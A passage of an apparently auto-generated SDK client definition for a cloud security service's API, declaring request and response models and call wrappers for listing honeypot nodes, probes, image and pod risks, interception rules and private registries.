  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListHoneypotAlarmEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'GET',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listHoneypotAlarmEvents(request: ListHoneypotAlarmEventsRequest): ListHoneypotAlarmEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return listHoneypotAlarmEventsWithOptions(request, runtime);
}

model ListHoneypotNodeRequest {
  currentPage?: int32(name='CurrentPage'),
  nodeId?: string(name='NodeId'),
  nodeName?: string(name='NodeName'),
  pageSize?: int32(name='PageSize'),
}

model ListHoneypotNodeResponseBody = {
  code?: string(name='Code'),
  honeypotNodeList?: [ 
    {
      allowHoneypotAccessInternet?: boolean(name='AllowHoneypotAccessInternet'),
      createTime?: string(name='CreateTime'),
      defaultNode?: boolean(name='DefaultNode'),
      ecsInstanceId?: string(name='EcsInstanceId'),
      honeypotTotalCount?: int32(name='HoneypotTotalCount'),
      honeypotUsedCount?: int32(name='HoneypotUsedCount'),
      nodeId?: string(name='NodeId'),
      nodeIp?: string(name='NodeIp'),
      nodeName?: string(name='NodeName'),
      probeTotalCount?: int32(name='ProbeTotalCount'),
      probeUsedCount?: int32(name='ProbeUsedCount'),
      securityGroupProbeIpList?: [ string ](name='SecurityGroupProbeIpList'),
      totalStatus?: int32(name='TotalStatus'),
      upgradeAvailable?: boolean(name='UpgradeAvailable'),
    }
  ](name='HoneypotNodeList'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  message?: string(name='Message'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model ListHoneypotNodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListHoneypotNodeResponseBody(name='body'),
}

async function listHoneypotNodeWithOptions(request: ListHoneypotNodeRequest, runtime: Util.RuntimeOptions): ListHoneypotNodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  if (!Util.isUnset(request.nodeName)) {
    query['NodeName'] = request.nodeName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListHoneypotNode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listHoneypotNode(request: ListHoneypotNodeRequest): ListHoneypotNodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return listHoneypotNodeWithOptions(request, runtime);
}

model ListHoneypotPresetRequest {
  currentPage?: int32(name='CurrentPage'),
  honeypotImageName?: string(name='HoneypotImageName'),
  lang?: string(name='Lang'),
  nodeId?: string(name='NodeId'),
  nodeName?: string(name='NodeName'),
  pageSize?: int32(name='PageSize'),
  presetName?: string(name='PresetName'),
}

model ListHoneypotPresetResponseBody = {
  code?: string(name='Code'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  list?: [ 
    {
      controlNodeName?: string(name='ControlNodeName'),
      honeypotImageDisplayName?: string(name='HoneypotImageDisplayName'),
      honeypotImageName?: string(name='HoneypotImageName'),
      honeypotPresetId?: string(name='HoneypotPresetId'),
      nodeId?: string(name='NodeId'),
      presetName?: string(name='PresetName'),
      presetType?: string(name='PresetType'),
    }
  ](name='List'),
  message?: string(name='Message'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model ListHoneypotPresetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListHoneypotPresetResponseBody(name='body'),
}

async function listHoneypotPresetWithOptions(request: ListHoneypotPresetRequest, runtime: Util.RuntimeOptions): ListHoneypotPresetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.honeypotImageName)) {
    query['HoneypotImageName'] = request.honeypotImageName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  if (!Util.isUnset(request.nodeName)) {
    query['NodeName'] = request.nodeName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.presetName)) {
    query['PresetName'] = request.presetName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListHoneypotPreset',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listHoneypotPreset(request: ListHoneypotPresetRequest): ListHoneypotPresetResponse {
  var runtime = new Util.RuntimeOptions{};
  return listHoneypotPresetWithOptions(request, runtime);
}

model ListHoneypotProbeRequest {
  currentPage?: int32(name='CurrentPage'),
  displayName?: string(name='DisplayName'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
  probeStatus?: string(name='ProbeStatus'),
  probeType?: string(name='ProbeType'),
}

model ListHoneypotProbeResponseBody = {
  code?: string(name='Code'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  list?: [ 
    {
      controlNode?: {
        ecsInstanceId?: string(name='EcsInstanceId'),
        nodeId?: string(name='NodeId'),
        nodeName?: string(name='NodeName'),
      }(name='ControlNode'),
      deployTime?: long(name='DeployTime'),
      displayName?: string(name='DisplayName'),
      hostIp?: string(name='HostIp'),
      osType?: string(name='OsType'),
      probeId?: string(name='ProbeId'),
      probeType?: string(name='ProbeType'),
      probeVersion?: string(name='ProbeVersion'),
      status?: string(name='Status'),
      uuid?: string(name='Uuid'),
      vpcId?: string(name='VpcId'),
    }
  ](name='List'),
  message?: string(name='Message'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model ListHoneypotProbeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListHoneypotProbeResponseBody(name='body'),
}

async function listHoneypotProbeWithOptions(request: ListHoneypotProbeRequest, runtime: Util.RuntimeOptions): ListHoneypotProbeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.displayName)) {
    query['DisplayName'] = request.displayName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.probeStatus)) {
    query['ProbeStatus'] = request.probeStatus;
  }
  if (!Util.isUnset(request.probeType)) {
    query['ProbeType'] = request.probeType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListHoneypotProbe',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listHoneypotProbe(request: ListHoneypotProbeRequest): ListHoneypotProbeResponse {
  var runtime = new Util.RuntimeOptions{};
  return listHoneypotProbeWithOptions(request, runtime);
}

model ListImageRegistryRegionResponseBody = {
  regions?: [ 
    {
      regionId?: string(name='RegionId'),
      regionName?: string(name='RegionName'),
    }
  ](name='Regions'),
  requestId?: string(name='RequestId'),
}

model ListImageRegistryRegionResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListImageRegistryRegionResponseBody(name='body'),
}

async function listImageRegistryRegionWithOptions(runtime: Util.RuntimeOptions): ListImageRegistryRegionResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'ListImageRegistryRegion',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listImageRegistryRegion(): ListImageRegistryRegionResponse {
  var runtime = new Util.RuntimeOptions{};
  return listImageRegistryRegionWithOptions(runtime);
}

model ListImageRiskRequest {
  appName?: string(name='AppName'),
  clusterId?: string(name='ClusterId'),
  currentPage?: int32(name='CurrentPage'),
  imageName?: string(name='ImageName'),
  namespace?: string(name='Namespace'),
  pageSize?: int32(name='PageSize'),
}

model ListImageRiskResponseBody = {
  imageRiskList?: [ 
    {
      digest?: string(name='Digest'),
      endPointList?: [ 
        {
          domains?: [ string ](name='Domains'),
          type?: string(name='Type'),
        }
      ](name='EndPointList'),
      endpoints?: string(name='Endpoints'),
      image?: string(name='Image'),
      imageAccessType?: string(name='ImageAccessType', example='IN_SAS/NOT_IN_SAS/K8S_SYSTEM'),
      imageId?: string(name='ImageId'),
      internetURLs?: string(name='InternetURLs'),
      regionId?: string(name='RegionId'),
      registryType?: string(name='RegistryType'),
      repoId?: string(name='RepoId'),
      repoName?: string(name='RepoName'),
      repoNamespace?: string(name='RepoNamespace'),
      repoType?: string(name='RepoType'),
      statistics?: string(name='Statistics'),
      tag?: string(name='Tag'),
      tagImmutable?: int32(name='TagImmutable'),
      uuid?: string(name='Uuid'),
      vpcURLs?: string(name='VpcURLs'),
    }
  ](name='ImageRiskList'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model ListImageRiskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListImageRiskResponseBody(name='body'),
}

async function listImageRiskWithOptions(request: ListImageRiskRequest, runtime: Util.RuntimeOptions): ListImageRiskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.appName)) {
    query['AppName'] = request.appName;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.imageName)) {
    query['ImageName'] = request.imageName;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListImageRisk',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listImageRisk(request: ListImageRiskRequest): ListImageRiskResponse {
  var runtime = new Util.RuntimeOptions{};
  return listImageRiskWithOptions(request, runtime);
}

model ListInstanceCatalogRequest {
  lang?: string(name='Lang'),
}

model ListInstanceCatalogResponseBody = {
  requestId?: string(name='RequestId'),
  vendors?: [ 
    {
      instanceTypes?: [ 
        {
          instanceSubTypes?: [ 
            {
              name?: string(name='Name'),
            }
          ](name='InstanceSubTypes'),
          name?: string(name='Name'),
        }
      ](name='InstanceTypes'),
      name?: string(name='Name'),
    }
  ](name='Vendors'),
}

model ListInstanceCatalogResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListInstanceCatalogResponseBody(name='body'),
}

async function listInstanceCatalogWithOptions(request: ListInstanceCatalogRequest, runtime: Util.RuntimeOptions): ListInstanceCatalogResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListInstanceCatalog',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listInstanceCatalog(request: ListInstanceCatalogRequest): ListInstanceCatalogResponse {
  var runtime = new Util.RuntimeOptions{};
  return listInstanceCatalogWithOptions(request, runtime);
}

model ListInterceptionHistoryRequest {
  clusterId?: string(name='ClusterId'),
  currentPage?: int32(name='CurrentPage'),
  endTime?: long(name='EndTime'),
  historyName?: string(name='HistoryName'),
  interceptionTypes?: [ int32 ](name='InterceptionTypes'),
  pageSize?: int32(name='PageSize'),
  startTime?: long(name='StartTime'),
}

model ListInterceptionHistoryResponseBody = {
  interceptionHistoryList?: [ 
    {
      clusterId?: string(name='ClusterId'),
      clusterName?: string(name='ClusterName'),
      dstAppName?: string(name='DstAppName'),
      dstNamespace?: string(name='DstNamespace'),
      dstPort?: long(name='DstPort'),
      dstRuleTargetName?: string(name='DstRuleTargetName'),
      firstTime?: long(name='FirstTime'),
      id?: long(name='Id'),
      interceptionName?: long(name='InterceptionName'),
      interceptionType?: int32(name='InterceptionType'),
      lastTime?: long(name='LastTime'),
      realDstAppName?: string(name='RealDstAppName'),
      realDstImageName?: string(name='RealDstImageName'),
      realDstNamespace?: string(name='RealDstNamespace'),
      realDstPodName?: string(name='RealDstPodName'),
      realInterceptionType?: int32(name='RealInterceptionType'),
      realSrcAppName?: string(name='RealSrcAppName'),
      realSrcImageName?: string(name='RealSrcImageName'),
      realSrcNamespace?: string(name='RealSrcNamespace'),
      realSrcPodName?: string(name='RealSrcPodName'),
      riskLevel?: long(name='RiskLevel'),
      ruleId?: long(name='RuleId'),
      ruleName?: string(name='RuleName'),
      srcAppName?: string(name='SrcAppName'),
      srcNamespace?: string(name='SrcNamespace'),
      srcRuleTargetName?: string(name='SrcRuleTargetName'),
      status?: long(name='Status'),
      tryCount?: int32(name='TryCount'),
    }
  ](name='InterceptionHistoryList'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model ListInterceptionHistoryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListInterceptionHistoryResponseBody(name='body'),
}

async function listInterceptionHistoryWithOptions(request: ListInterceptionHistoryRequest, runtime: Util.RuntimeOptions): ListInterceptionHistoryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.historyName)) {
    query['HistoryName'] = request.historyName;
  }
  if (!Util.isUnset(request.interceptionTypes)) {
    query['InterceptionTypes'] = request.interceptionTypes;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListInterceptionHistory',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listInterceptionHistory(request: ListInterceptionHistoryRequest): ListInterceptionHistoryResponse {
  var runtime = new Util.RuntimeOptions{};
  return listInterceptionHistoryWithOptions(request, runtime);
}

model ListInterceptionImageResponseBody = {
  imageList?: [ 
    {
      imageName?: string(name='ImageName'),
      imageUuid?: string(name='ImageUuid'),
    }
  ](name='ImageList'),
  requestId?: string(name='RequestId'),
}

model ListInterceptionImageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListInterceptionImageResponseBody(name='body'),
}

async function listInterceptionImageWithOptions(runtime: Util.RuntimeOptions): ListInterceptionImageResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'ListInterceptionImage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listInterceptionImage(): ListInterceptionImageResponse {
  var runtime = new Util.RuntimeOptions{};
  return listInterceptionImageWithOptions(runtime);
}

model ListInterceptionRulePageRequest {
  clusterId?: string(name='ClusterId'),
  criteria?: string(name='Criteria'),
  criteriaType?: string(name='CriteriaType'),
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
}

model ListInterceptionRulePageResponseBody = {
  interceptionRuleList?: [ 
    {
      dstTarget?: {
        appName?: string(name='AppName'),
        imageList?: [ string ](name='ImageList'),
        namespace?: string(name='Namespace'),
        ports?: [ string ](name='Ports'),
        ruleType?: string(name='RuleType'),
        tagList?: [ string ](name='TagList'),
        targetId?: int32(name='TargetId'),
        targetName?: string(name='TargetName'),
        targetType?: string(name='TargetType'),
      }(name='DstTarget'),
      interceptType?: long(name='InterceptType'),
      orderIndex?: long(name='OrderIndex'),
      ruleId?: long(name='RuleId'),
      ruleName?: string(name='RuleName'),
      ruleSwitch?: int32(name='RuleSwitch'),
      ruleType?: string(name='RuleType'),
      srcTarget?: {
        appName?: string(name='AppName'),
        imageList?: [ string ](name='ImageList'),
        namespace?: string(name='Namespace'),
        ruleType?: string(name='RuleType'),
        tagList?: [ string ](name='TagList'),
        targetId?: int32(name='TargetId'),
        targetName?: string(name='TargetName'),
        targetType?: string(name='TargetType'),
      }(name='SrcTarget'),
    }
  ](name='InterceptionRuleList'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model ListInterceptionRulePageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListInterceptionRulePageResponseBody(name='body'),
}

async function listInterceptionRulePageWithOptions(request: ListInterceptionRulePageRequest, runtime: Util.RuntimeOptions): ListInterceptionRulePageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.criteriaType)) {
    query['CriteriaType'] = request.criteriaType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListInterceptionRulePage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listInterceptionRulePage(request: ListInterceptionRulePageRequest): ListInterceptionRulePageResponse {
  var runtime = new Util.RuntimeOptions{};
  return listInterceptionRulePageWithOptions(request, runtime);
}

model ListInterceptionTargetPageRequest {
  appName?: string(name='AppName'),
  currentPage?: int32(name='CurrentPage'),
  imageList?: [ string ](name='ImageList'),
  namespace?: string(name='Namespace'),
  pageSize?: int32(name='PageSize'),
  tagList?: [ string ](name='TagList'),
  targetName?: string(name='TargetName'),
  targetType?: string(name='TargetType'),
}

model ListInterceptionTargetPageResponseBody = {
  pageInfo?: {
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
  ruleTargetList?: [ 
    {
      appName?: string(name='AppName'),
      clusterId?: string(name='ClusterId'),
      clusterName?: string(name='ClusterName'),
      imageList?: [ string ](name='ImageList'),
      namespace?: string(name='Namespace'),
      ruleType?: string(name='RuleType'),
      tagList?: [ string ](name='TagList'),
      targetId?: long(name='TargetId'),
      targetName?: string(name='TargetName'),
      targetType?: string(name='TargetType'),
    }
  ](name='RuleTargetList'),
}

model ListInterceptionTargetPageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListInterceptionTargetPageResponseBody(name='body'),
}

async function listInterceptionTargetPageWithOptions(request: ListInterceptionTargetPageRequest, runtime: Util.RuntimeOptions): ListInterceptionTargetPageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.appName)) {
    query['AppName'] = request.appName;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.imageList)) {
    query['ImageList'] = request.imageList;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.tagList)) {
    query['TagList'] = request.tagList;
  }
  if (!Util.isUnset(request.targetName)) {
    query['TargetName'] = request.targetName;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListInterceptionTargetPage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listInterceptionTargetPage(request: ListInterceptionTargetPageRequest): ListInterceptionTargetPageResponse {
  var runtime = new Util.RuntimeOptions{};
  return listInterceptionTargetPageWithOptions(request, runtime);
}

model ListPluginForUuidRequest {
  types?: [ string ](name='Types'),
  uuid?: string(name='Uuid'),
}

model ListPluginForUuidShrinkRequest {
  typesShrink?: string(name='Types'),
  uuid?: string(name='Uuid'),
}

model ListPluginForUuidResponseBody = {
  aegisUuidTargetPluginConfigList?: [ 
    {
      aegisSuspiciousConfigList?: [ 
        {
          config?: boolean(name='Config'),
          msg?: string(name='Msg'),
          overallConfig?: boolean(name='OverallConfig'),
          type?: string(name='Type'),
        }
      ](name='AegisSuspiciousConfigList'),
      pluginInstallCode?: string(name='PluginInstallCode'),
      pluginName?: string(name='PluginName'),
      pluginOnlineInstalled?: boolean(name='PluginOnlineInstalled'),
      pluginOnlineStatus?: boolean(name='PluginOnlineStatus'),
      pluginVersion?: string(name='PluginVersion'),
    }
  ](name='AegisUuidTargetPluginConfigList'),
  code?: int32(name='Code'),
  message?: string(name='Message'),
  requestId?: string(name='RequestId'),
}

model ListPluginForUuidResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListPluginForUuidResponseBody(name='body'),
}

async function listPluginForUuidWithOptions(tmpReq: ListPluginForUuidRequest, runtime: Util.RuntimeOptions): ListPluginForUuidResponse {
  Util.validateModel(tmpReq);
  var request = new ListPluginForUuidShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.types)) {
    request.typesShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.types, 'Types', 'simple');
  }
  var query = {};
  if (!Util.isUnset(request.typesShrink)) {
    query['Types'] = request.typesShrink;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListPluginForUuid',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listPluginForUuid(request: ListPluginForUuidRequest): ListPluginForUuidResponse {
  var runtime = new Util.RuntimeOptions{};
  return listPluginForUuidWithOptions(request, runtime);
}

model ListPodRiskRequest {
  appName?: string(name='AppName'),
  clusterId?: string(name='ClusterId'),
  currentPage?: long(name='CurrentPage'),
  namespace?: string(name='Namespace'),
  pageSize?: long(name='PageSize'),
  podName?: string(name='PodName'),
}

model ListPodRiskResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  podRiskList?: [ 
    {
      alarmCount?: int32(name='AlarmCount'),
      clusterId?: string(name='ClusterId'),
      clusterName?: string(name='ClusterName'),
      createTime?: long(name='CreateTime'),
      hcCount?: int32(name='HcCount'),
      instanceId?: string(name='InstanceId'),
      namespace?: string(name='Namespace'),
      nodeName?: string(name='NodeName'),
      pod?: string(name='Pod'),
      podIp?: string(name='PodIp'),
      vulCount?: int32(name='VulCount'),
    }
  ](name='PodRiskList'),
  requestId?: string(name='RequestId'),
}

model ListPodRiskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListPodRiskResponseBody(name='body'),
}

async function listPodRiskWithOptions(request: ListPodRiskRequest, runtime: Util.RuntimeOptions): ListPodRiskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.appName)) {
    query['AppName'] = request.appName;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.podName)) {
    query['PodName'] = request.podName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListPodRisk',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listPodRisk(request: ListPodRiskRequest): ListPodRiskResponse {
  var runtime = new Util.RuntimeOptions{};
  return listPodRiskWithOptions(request, runtime);
}

model ListPrivateRegistryListRequest {
  registryType?: string(name='RegistryType'),
}

model ListPrivateRegistryListResponseBody = {
  imageRegistryInfos?: [ 
    {
      aliUid?: long(name='AliUid'),
      domainName?: string(name='DomainName'),
      id?: long(name='Id'),
      jenkinsEnv?: string(name='JenkinsEnv'),
      netType?: long(name='NetType'),
      password?: string(name='Password'),
      persistenceDay?: long(name='PersistenceDay'),
      protocolType?: long(name='ProtocolType'),
      regionId?: string(name='RegionId'),
      registryHostIp?: string(name='RegistryHostIp'),
      registryName?: string(name='RegistryName'),
      registryType?: string(name='RegistryType'),
      registryVersion?: string(name='RegistryVersion'),
      token?: string(name='Token'),
      transPerHour?: int32(name='TransPerHour'),
      userName?: string(name='UserName'),
      vpcId?: string(name='VpcId'),
      whiteList?: string(name='WhiteList'),
    }
  ](name='ImageRegistryInfos'),
  requestId?: string(name='RequestId'),
}

model ListPrivateRegistryListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListPrivateRegistryListResponseBody(name='body'),
}

async function listPrivateRegistryListWithOptions(request: ListPrivateRegistryListRequest, runtime: Util.RuntimeOptions): ListPrivateRegistryListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.registryType)) {
    query['RegistryType'] = request.registryType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListPrivateRegistryList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listPrivateRegistryList(request: ListPrivateRegistryListRequest): ListPrivateRegistryListResponse {
  var runtime = new Util.RuntimeOptions{};
  return listPrivateRegistryListWithOptions(request, runtime);
}

model ListPrivateRegistryTypeResponseBody = {
  registryTypeInfos?: [ 
    {
      count?: long(name='Count'),
      registryType?: string(name='RegistryType'),
    }
  ](name='RegistryTypeInfos'),
  requestId?: string(name='RequestId'),
}

model ListPrivateRegistryTypeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListPrivateRegistryTypeResponseBody(name='body'),
}

async function listPrivateRegistryTypeWithOptions(runtime: Util.RuntimeOptions): ListPrivateRegistryTypeResponse {
